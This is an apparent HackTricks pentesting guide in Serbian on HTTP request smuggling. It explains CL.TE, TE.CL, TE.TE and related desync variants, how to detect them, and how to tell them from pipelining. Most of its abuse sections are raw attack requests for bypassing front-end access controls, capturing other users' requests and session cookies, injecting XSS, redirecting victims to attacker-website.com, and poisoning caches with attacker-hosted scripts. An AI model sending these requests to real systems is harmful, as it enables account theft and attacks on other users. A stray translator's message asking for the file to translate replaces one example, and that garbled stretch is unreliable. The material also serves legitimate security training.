# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Šta je

Ova ranjivost se javlja kada postoji **desinhronizacija** između **front-end proxies** i **back-end** servera koja omogućava **attacker**-u da **pošalje** HTTP **request** koji će biti **interpretiran** kao **jedan request** od strane **front-end** proxies (load balance/reverse-proxy), a **kao 2 request-a** od strane **back-end** servera.\
Ovo omogućava korisniku da **izmeni sledeći request koji stigne do back-end servera nakon njegovog**.

### Teorija

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Realnost

Prednji sloj (a load-balance / Reverse Proxy) obrađuje _**Content-Length**_ ili _**Transfer-Encoding**_ header, a **back-end** server obrađuje onaj drugi, što izaziva **desinhronizaciju** između ta dva sistema.\
Ovo može biti veoma kritično jer **attacker** će moći da pošalje jedan request ka reverse proxy-ju koji će **back-end** server **interpretirati** kao **2 različita request-a**. Opasnost ove tehnike leži u tome što će **back-end** server tretirati **drugi injektovani request** kao da je **stigao od narednog klijenta**, dok će **stvarni request** tog klijenta postati **deo injektovanog request-a**.

### Specifičnosti

Zapamtite da u HTTP-u **karakter novog reda se sastoji od 2 bajta:**

- **Content-Length**: Ovaj header koristi **decimalni broj** da označi **broj bajtova** tela request-a. Body se očekuje da se završi poslednjim karakterom, **novi red nije potreban na kraju request-a**.
- **Transfer-Encoding:** Ovaj header koristi u **telu** **heksadecimalni broj** da označi **broj bajtova** narednog **chunka**. **Chunk** mora da se **završi** sa **novim redom**, ali taj novi red **nije uračunat** u indikator dužine. Ovaj način transfera mora da se završi sa **chunk-om veličine 0 praćenim sa 2 nova reda**: `0`
- **Connection**: Iz mog iskustva preporučuje se korišćenje **`Connection: keep-alive`** na prvom request-u kod request smuggling-a.

## Osnovni primeri

> [!TIP]
> Kada pokušavate da ovo eksploatišete sa Burp Suite-om **isključite `Update Content-Length` i `Normalize HTTP/1 line endings`** u repeater-u zato što neki gadget-i zloupotrebljavaju nove linije, carriage return-e i malformed content-length vrednosti.

HTTP request smuggling napadi se prave slanjem dvosmislenih zahteva koji iskorišćavaju razlike u tumačenju `Content-Length` (CL) i `Transfer-Encoding` (TE) header-a između front-end i back-end servera. Ovi napadi se mogu manifestovati u različitim oblicima, pre svega kao **CL.TE**, **TE.CL**, i **TE.TE**. Svaka vrsta predstavlja jedinstvenu kombinaciju prioriteta koje front-end i back-end serveri daju ovim header-ima. Ranjivosti nastaju zato što serveri procesiraju isti request na različite načine, što dovodi do neočekivanih i potencijalno zlonamernih ishoda.

### Osnovni primeri tipova ranjivosti

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> Na prethodnu tabelu bi trebalo dodati tehniku TE.0, slično CL.0 tehnici ali koristeći Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Procesira request na osnovu `Content-Length` header-a.
- **Back-End (TE):** Procesira request na osnovu `Transfer-Encoding` header-a.
- **Scenarijo napada:**

- Attacker šalje request gde vrednost `Content-Length` header-a ne odgovara stvarnoj dužini sadržaja.
- Front-end server prosleđuje čitav request prema back-end-u na osnovu vrednosti `Content-Length`.
- Back-end server obrađuje request kao chunked zbog `Transfer-Encoding: chunked` header-a, interpretirajući preostale podatke kao odvojen, naknadni request.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Procesira request na osnovu `Transfer-Encoding` header-a.
- **Back-End (CL):** Procesira request na osnovu `Content-Length` header-a.
- **Scenarijo napada:**

- Attacker šalje chunked request gde veličina chunka (`7b`) i stvarna dužina sadržaja (`Content-Length: 4`) nisu usklađene.
- Front-end server, poštujući `Transfer-Encoding`, prosleđuje čitav request back-end-u.
- Back-end server, poštujući `Content-Length`, obrađuje samo početni deo request-a (`7b` bajtova), ostavljajući ostatak kao deo nenamernog naknadnog request-a.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Oboje podržavaju `Transfer-Encoding`, ali jedan može biti prevaren obfuskovanjem tako da ga ne prepozna.
- **Scenarijo napada:**

- Attacker šalje request sa obfuskovanim `Transfer-Encoding` header-ima.
- U zavisnosti koji server (front-end ili back-end) ne prepozna obfuskaciju, može se iskoristiti CL.TE ili TE.CL ranjivost.
- Nepromenjeni deo request-a, kako ga jedan od servera vidi, postaje deo naknadnog request-a, što vodi do smuggling-a.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Oboje servera obrađuju request isključivo na osnovu `Content-Length` header-a.
- Ovaj scenarijo obično ne dovodi do smuggling-a, jer postoji usklađenost u načinu na koji oba servera tumače dužinu request-a.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Odnosi se na scenarije gde `Content-Length` header postoji i ima vrednost različitu od nule, što znači da telo request-a ima sadržaj. Back-end ignoriše `Content-Length` header (tretira ga kao 0), ali front-end ga parsira.
- Ovo je važno za razumevanje i kreiranje smuggling napada, jer utiče na to kako serveri određuju kraj request-a.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Kao prethodni, ali koristeći TE
- Tehnika [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Primer**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Rušenje web servera

Ova tehnika je takođe korisna u scenarijima gde je moguće da se **web server sruši tokom čitanja inicijalnih HTTP podataka**, ali **bez zatvaranja konekcije**. Na taj način, **body** HTTP zahteva biće smatran za **next HTTP request**.

Na primer, kao što je objašnjeno u [**this writeup**](https://mizu.re/post/twisty-python), u Werkzeugu je bilo moguće poslati neke **Unicode** karaktere i to će naterati server da se **break**. Međutim, ako je HTTP konekcija kreirana sa header-om **`Connection: keep-alive`**, body zahteva neće biti pročitan i konekcija će ostati otvorena, tako da će se **body** zahteva tretirati kao **next HTTP request**.

#### Forcing via hop-by-hop headers

Abuziranjem hop-by-hop headers možete naterati proxy da **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
For **više informacija o hop-by-hop headers** posetite:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Otkrivanje HTTP Request Smuggling

Identifikacija ranjivosti HTTP request smuggling često se može postići korišćenjem tehnika zasnovanih na vremenu (timing techniques), koje se oslanjaju na posmatranje koliko vremena serveru treba da odgovori na manipulisan zahtev. Ove tehnike su posebno korisne za otkrivanje CL.TE i TE.CL ranjivosti. Pored ovih metoda, postoje i druge strategije i alati koji se mogu koristiti za pronalaženje takvih ranjivosti:

### Pronalaženje CL.TE ranjivosti korišćenjem tehnika zasnovanih na vremenu

- **Metod:**

- Pošaljite zahtev koji će, ako je aplikacija ranjiva, naterati back-end server da čeka dodatne podatke.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Posmatranje:**
- Front-end server obrađuje zahtev na osnovu `Content-Length` i prerano prekida poruku.
- Back-end server, očekujući poruku u chunked formatu, čeka sledeći chunk koji nikada ne stigne, što izaziva kašnjenje.

- **Indikatori:**
- Timeout-i ili dugo kašnjenje odgovora.
- Primanje 400 Bad Request greške od back-end servera, ponekad sa detaljnim informacijama o serveru.

### Pronalaženje TE.CL ranjivosti korišćenjem tehnika zasnovanih na vremenu

- **Metod:**

- Pošaljite zahtev koji će, ako je aplikacija ranjiva, naterati back-end server da čeka dodatne podatke.
- **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Posmatranje:**
- Front-end server obrađuje zahtev na osnovu `Transfer-Encoding` i prosleđuje celu poruku.
- Back-end server, očekujući poruku na osnovu `Content-Length`, čeka dodatne podatke koji nikada ne stignu, što izaziva kašnjenje.

### Druge metode za pronalaženje ranjivosti

- **Differential Response Analysis:**
- Pošaljite malo različite verzije zahteva i posmatrajte da li se odgovori servera neočekivano razlikuju, što može ukazivati na razliku u parsiranju.
- **Korišćenje automatizovanih alata:**
- Alati poput Burp Suite-ovog 'HTTP Request Smuggler' ekstenzije mogu automatski testirati ove ranjivosti slanjem različitih oblika dvosmislenih zahteva i analizom odgovora.
- **Content-Length Variance Tests:**
- Pošaljite zahteve sa različitim vrednostima `Content-Length` koje nisu u skladu sa stvarnom dužinom sadržaja i posmatrajte kako server postupa sa takvim neusklađenostima.
- **Transfer-Encoding Variance Tests:**
- Pošaljite zahteve sa obfuskiranim ili malformisanim `Transfer-Encoding` zaglavljima i pratite kako front-end i back-end serveri različito reaguju na takve manipulacije.

### HTTP Request Smuggling Vulnerability Testing

Nakon potvrde efikasnosti tehnika zasnovanih na vremenu, ključno je proveriti da li se klijentski zahtevi mogu manipulisati. Jednostavan metod je pokušaj poisoning vaših zahteva, na primer da zahtev za `/` rezultira 404 odgovorom. Primeri `CL.TE` i `TE.CL` ranije diskutovani u [Basic Examples](#basic-examples) pokazuju kako poisoning zahteva može izazvati 404 odgovor, iako klijent pokušava da pristupi drugom resursu.

**Ključna razmatranja**

Kada testirate request smuggling narušavanjem drugih zahteva, imajte na umu:

- **Različite mrežne konekcije:** "attack" i "normal" zahtevi treba da budu poslati preko odvojenih mrežnih konekcija. Korišćenje iste konekcije za oba ne potvrđuje postojanje ranjivosti.
- **Konzistentan URL i parametri:** Nastojte da koristite iste URL-ove i nazive parametara za oba zahteva. Moderne aplikacije često rutuju zahteve ka specifičnim back-end serverima na osnovu URL-a i parametara. Podudaranje ovih vrednosti povećava verovatnoću da će oba zahteva obraditi isti server, što je preduslov za uspešan attack.
- **Vremenski uslovi i takmičenje (racing conditions):** "Normal" zahtev, koji treba da detektuje interferenciju od "attack" zahteva, takmiči se sa drugim istovremenim zahtevima aplikacije. Zbog toga pošaljite "normal" zahtev odmah nakon "attack" zahteva. Zauzete aplikacije mogu zahtevati više pokušaja za konačnu potvrdu ranjivosti.
- **Izazovi load balancing-a:** Front-end serveri koji deluju kao load balanceri mogu raspodeliti zahteve na različite back-end sisteme. Ako se "attack" i "normal" zahtevi završe na različitim sistemima, attack neće uspeti. Ovaj aspekt load balancing-a može zahtevati nekoliko pokušaja da se potvrdi ranjivost.
- **Neželjeni uticaj na korisnike:** Ako vaš attack nenamerno utiče na zahtev drugog korisnika (ne na "normal" zahtev koji ste poslali za detekciju), to ukazuje da je vaš attack uticao na drugog korisnika aplikacije. Kontinuirano testiranje može ometati druge korisnike, te je potreban oprezan pristup.

## Razlikovanje HTTP/1.1 pipelining artefakata i stvarnog request smuggling-a

Ponovno korišćenje konekcije (keep-alive) i pipelining lako mogu stvoriti iluzije "smuggling-a" u alatima za testiranje koji šalju više zahteva preko istog soketa. Naučite da razlikujete bezopasne klijentske artefakte od pravog server-side desync-a.

### Zašto pipelining stvara klasične lažne pozitivne rezultate

HTTP/1.1 ponovo koristi jednu TCP/TLS konekciju i konkatenira zahteve i odgovore na istom stream-u. U pipelining režimu, klijent šalje više zahteva zaredom i očekuje odgovore redosledom slanja. Čest lažni pozitivan slučaj je ponovno slanje malformisanog CL.0-stila payload-a dva puta na jednoj konekciji:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Molim pošaljite sadržaj fajla src/pentesting-web/http-request-smuggling/README.md koji želite da prevedem. Napomena: zadržaću istu markdown/html sintaksu i neću prevoditi kod, nazive tehnika, cloud/SaaS nazive, reči poput "leak" i "pentesting", niti linkove, putanje i tagove koje ste naveli.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Ako je server ignorisao neispravan `Content_Length`, nema FE↔BE desync. Pri reuse, vaš klijent je zapravo poslao ovaj byte-stream, koji je server parsirao kao dva nezavisna zahteva:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Uticaj: nijedan. Upravo ste desynced svoj klijent od server framinga.

> [!TIP]
> Burp moduli koji zavise od reuse/pipelining: Turbo Intruder sa `requestsPerConnection>1`, Intruder sa "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" ili "Enable connection reuse".

### Litmus testovi: pipelining or real desync?

1. Disable reuse and re-test
- U Burp Intruder/Repeater, isključite HTTP/1 reuse i izbegavajte "Send group in sequence".
- U Turbo Intruder, podesite `requestsPerConnection=1` i `pipeline=False`.
- Ako ponašanje nestane, verovatno je u pitanju client-side pipelining, osim ako ne radite sa connection-locked/stateful ciljevima ili client-side desync.
2. HTTP/2 nested-response check
- Pošaljite HTTP/2 zahtev. Ako telo odgovora sadrži kompletnu nested HTTP/1 response, dokazali ste backend parsing/desync bag umesto čistog client artefakta.
3. Partial-requests probe for connection-locked front-ends
- Neki FEs ponovo koriste upstream BE konekciju samo ako je klijent ponovo koristio svoju. Koristite partial-requests da detektujete FE ponašanje koje ogleda client reuse.
- Pogledajte PortSwigger "Browser‑Powered Desync Attacks" za connection-locked tehniku.
4. State probes
- Tražite razlike između prvog i narednih zahteva na istoj TCP konekciji (first-request routing/validation).
- Burp "HTTP Request Smuggler" uključuje connection‑state probe koji automatizuje ovo.
5. Visualize the wire
- Koristite Burp "HTTP Hacker" ekstenziju da pregledate concatenation i message framing direktno dok eksperimentišete sa reuse i partial requests.

### Connection‑locked request smuggling (reuse-required)

Neki front-endovi ponovo koriste upstream konekciju samo kada klijent ponovo koristi svoju. Real smuggling postoji, ali je uslovljen client-side reuse. Da biste razlikovali i dokazali uticaj:
- Dokažite server-side bug
- Koristite HTTP/2 nested-response check, ili
- Koristite partial-requests da pokažete da FE ponovo koristi upstream samo kada to klijent radi.
- Prikažite stvarni uticaj čak i ako je direktno cross-user socket abuse blokirano:
  - Cache poisoning: poison shared caches via the desync so responses affect other users.
  - Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
  - Bypass FE controls: smuggle restricted paths/methods past the front-end.
  - Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
  - Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
  - Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

Ako ciljate browser-powered/client-side desync, maliciozni zahtev mora biti poslat iz browser-a cross-origin. Header obfuscation trikovi neće raditi. Fokusirajte se na primitive dostupne preko navigation/fetch, i zatim pivotirajte na cache poisoning, header disclosure, ili front-end control bypass gde downstream komponente reflektuju ili cache-iraju odgovore.

Za pozadinu i end-to-end workflow-e:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): prikazuje low-level HTTP ponašanje i socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precizna kontrola nad connection reuse putem `requestsPerConnection`.
- Burp HTTP Request Smuggler: uključuje connection‑state probe za uočavanje first‑request routing/validation.

> [!NOTE]
> Smatrajte reuse-only efekte nebitnim osim ako ne možete dokazati server-side desync i priložiti konkretan uticaj (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, itd.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Ponekad front-end proxyji primenjuju sigurnosne mere i pažljivo proveravaju dolazne zahteve. Međutim, ove mere se mogu zaobići iskorišćavanjem HTTP Request Smuggling, omogućavajući neautorizovan pristup ograničenim endpoint-ima. Na primer, pristup `/admin` može biti zabranjen spolja, dok front-end proxy aktivno blokira takve pokušaje. Ipak, ovaj proxy može zanemariti inspekciju embedded zahteva unutar smuggled HTTP zahteva, ostavljajući rupu za zaobilaženje ovih ograničenja.

Razmotrite sledeće primere koji ilustruju kako se HTTP Request Smuggling može koristiti za zaobilaženje front-end sigurnosnih kontrola, posebno ciljajući putanju `/admin` koja je obično zaštićena front-end proxyjem:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
U CL.TE napadu, zaglavlje `Content-Length` se koristi za početni zahtev, dok se u sledećem ugrađenom zahtevu koristi zaglavlje `Transfer-Encoding: chunked`. Front-end proxy obrađuje početni `POST` zahtev, ali ne uspeva da ispita ugrađeni `GET /admin` zahtev, što omogućava neovlašćen pristup putanji `/admin`.

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Suprotno tome, u TE.CL attack, početni `POST` zahtev koristi `Transfer-Encoding: chunked`, a naredni ugneždeni zahtev se obrađuje na osnovu `Content-Length` zaglavlja. Slično CL.TE attack, front-end proxy previdi prokrijumčarani `GET /admin` zahtev, nenamerno omogućavajući pristup ograničenom `/admin` putu.

### Otkrivanje prepravljanja zahteva na front-endu <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacije često koriste **front-end server** da modifikuju dolazeće zahteve pre nego što ih proslede back-end serveru. Tipična izmena uključuje dodavanje zaglavlja, kao što je `X-Forwarded-For: <IP of the client>`, kako bi se IP klijenta prosledio back-endu. Razumevanje ovih izmena može biti ključno, jer može otkriti načine za **zaobilaženje zaštita** ili **otkrivanje skrivenih informacija ili krajnjih tačaka**.

Da biste ispitali kako proxy menja zahtev, pronađite POST parametar koji back-end vraća u odgovoru. Zatim sastavite zahtev, koristeći taj parametar kao poslednji, slično sledećem:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
U ovoj strukturi, komponenti narednog `request`-a se dodaju posle `search=`, koji je parameter reflektovan u `response`-u. Ovo reflektovanje će izložiti `headers` narednog `request`-a.

Važno je uskladiti `Content-Length` header u ugnježdenom `request`-u sa stvarnom dužinom sadržaja. Početak sa malom vrednošću i postepeno povećavanje je preporučljivo, jer će previše niska vrednost skratiti reflektovane podatke, dok će previše visoka vrednost izazvati grešku u `request`-u.

Ova tehnika je primenjiva i u kontekstu TE.CL ranjivosti, ali `request` treba da se završi sa `search=\r\n0`. Bez obzira na newline karaktere, vrednosti će se dodavati parametru `search`.

Ova metoda prvenstveno služi da se razumeju izmene `request`-a koje pravi front-end proxy, suštinski izvodeći samostalnu istragu.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Moguće je presresti `request`-e narednog user-a tako što se tokom `POST` operacije kao vrednost parametra doda specifičan `request`. Evo kako se to može izvesti:

Dodavanjem sledećeg `request`-a kao vrednosti parametra možete sačuvati `request` narednog client-a:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
U ovom scenariju, **comment parameter** je namenjen za čuvanje sadržaja unutar sekcije komentara objave na javno dostupnoj stranici. Shodno tome, sadržaj narednog zahteva pojaviće se kao komentar.

Međutim, ova tehnika ima ograničenja. Generalno, ona hvata podatke samo do delimiter-a parametra koji se koristi u smuggled request-u. Za URL-encoded form submissions, ovaj delimiter je karakter `&`. To znači da će uhvaćeni sadržaj iz zahteva žrtve prestati na prvom `&`, koji može biti čak i deo query string-a.

Takođe, vredi napomenuti da je ovaj pristup izvodljiv i kod TE.CL ranjivosti. U takvim slučajevima, zahtev bi trebalo da se završi sa `search=\r\n0`. Bez obzira na newline karaktere, vrednosti će biti dodate parametru search.

### Korišćenje HTTP request smuggling za iskorišćavanje Reflected XSS

HTTP Request Smuggling može da se iskoristi za napad na web stranice ranjive na **Reflected XSS**, nudeći značajne prednosti:

- Interakcija sa ciljanim korisnicima **nije potrebna**.
- Omogućava iskorišćavanje XSS u delovima zahteva koji su **normalno nedostupni**, kao što su HTTP request headers.

U scenarijima gde je web-sajt podložan Reflected XSS kroz User-Agent header, sledeći payload demonstrira kako iskoristiti ovu ranjivost:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload je strukturiran da iskoristi ranjivost na sledeći način:

1. Pokretanje `POST` request-a, naizgled tipično, sa `Transfer-Encoding: chunked` header-om da označi početak smuggling-a.
2. Sledeći `0`, označava kraj chunked message body.
3. Zatim se uvodi smugglovan `GET` request, gde je `User-Agent` header injektovan sa skriptom, `<script>alert(1)</script>`, pokrećući XSS kada server obradi ovaj naredni request.

Manipulišući `User-Agent` kroz smuggling, payload zaobilazi normalna ograničenja request-a, čime se iskorišćava Reflected XSS ranjivost na nestandardan ali efektivan način.

#### HTTP/0.9

> [!CAUTION]
> U slučaju da se korisnički sadržaj reflektuje u odgovoru sa **`Content-type`** kao što je **`text/plain`**, sprečavajući izvršavanje XSS-a. Ako server podržava **HTTP/0.9** možda je moguće ovo zaobići!

Verzija HTTP/0.9 prethodila je 1.0 i koristi samo **GET** metode i **ne** odgovara sa **headers**, već samo sa body.

U [**ovaj writeup**](https://mizu.re/post/twisty-python), ovo je zloupotrebljeno uz request smuggling i **ranjiv endpoint koji će odgovoriti sa inputom korisnika** da bi se smugglao request sa HTTP/0.9. Parametar koji će biti reflektovan u odgovoru sadržao je **lažni HTTP/1.1 response (with headers and body)** tako da odgovor sadrži validan izvršni JS kod sa `Content-Type` `text/html`.

### Eksploatisanje on-site preusmeravanja uz HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacije često preusmeravaju sa jednog URL-a na drugi koristeći hostname iz `Host` header-a u redirect URL-u. Ovo je uobičajeno kod web servera kao što su Apache i IIS. Na primer, zahtev za folder bez trailing slash-a rezultira preusmeravanjem da se uključi slash:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Rezultira u:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Iako naizgled bezazleno, ovo ponašanje se može manipulisati koristeći HTTP request smuggling da bi se korisnici preusmerili na eksterni sajt. Na primer:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ovaj smuggled request može uzrokovati da sledeći obrađeni korisnički zahtev bude preusmeren na sajt koji kontroliše napadač:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Rezultuje u:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
U ovom scenariju, zahtev korisnika za JavaScript fajlom je presretnut. Napadač može potencijalno kompromitovati korisnika tako što će u odgovoru poslužiti maliciozni JavaScript.

### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning može se izvesti ako bilo koja komponenta **front-end infrastructure caches content**, obično radi poboljšanja performansi. Manipulacijom odgovorom servera, moguće je **poison the cache**.

Ranije smo videli kako se odgovori servera mogu promeniti da vrate 404 grešku (pogledajte [Basic Examples](#basic-examples)). Slično tome, moguće je prevariti server da isporuči sadržaj `/index.html` kao odgovor na zahtev za `/static/include.js`. Posledično, sadržaj `/static/include.js` biva zamenjen u kešu sadržajem od `/index.html`, čineći `/static/include.js` nedostupnim korisnicima, što može dovesti do Denial of Service (DoS).

Ova tehnika postaje posebno snažna ako se otkrije **Open Redirect vulnerability** ili ako postoji **on-site redirect to an open redirect**. Takve ranjivosti se mogu iskoristiti za zamenu keširanog sadržaja `/static/include.js` skriptom pod kontrolom napadača, što u suštini omogućava raširen Cross-Site Scripting (XSS) napad protiv svih klijenata koji zahtevaju ažurirani `/static/include.js`.

Ispod je ilustracija iskorišćavanja **cache poisoning combined with an on-site redirect to open redirect**. Cilj je promeniti keširani sadržaj `/static/include.js` tako da servira JavaScript kod pod kontrolom napadača:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note the embedded request targeting `/post/next?postId=3`. This request will be redirected to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the attacker can redirect the request to their domain (**on-site redirect to open redirect**).

Nakon uspešnog **socket poisoning**, treba pokrenuti **GET request** za `/static/include.js`. Ovaj zahtev će biti kontaminiran prethodnim **on-site redirect to open redirect** zahtevom i preuzeti sadržaj skripte kojom upravlja napadač.

Nakon toga, svaki zahtev za `/static/include.js` će služiti keširani sadržaj napadačeve skripte, efikasno pokrećući široki XSS napad.

### Korišćenje HTTP request smuggling za izvođenje web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Koja je razlika između web cache poisoning i web cache deception?**
>
> - U **web cache poisoning**, napadač izaziva da aplikacija sačuva neki zlonamerni sadržaj u kešu, i taj sadržaj se zatim isporučuje iz keša drugim korisnicima aplikacije.
> - U **web cache deception**, napadač izaziva da aplikacija sačuva osetljiv sadržaj koji pripada drugom korisniku u kešu, a napadač potom preuzme taj sadržaj iz keša.

Napadač kreira smuggled request koji preuzme osetljiv sadržaj specifičan za korisnika. Razmotrite sledeći primer:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ako ovaj smuggled request otruje cache entry namenjen static content-u (npr. `/someimage.png`), osetljivi podaci žrtve iz `/private/messages` mogu biti keširani pod cache entry-jem statičkog sadržaja. Kao posledica, attacker bi potencijalno mogao da preuzme te keširane osetljive podatke.

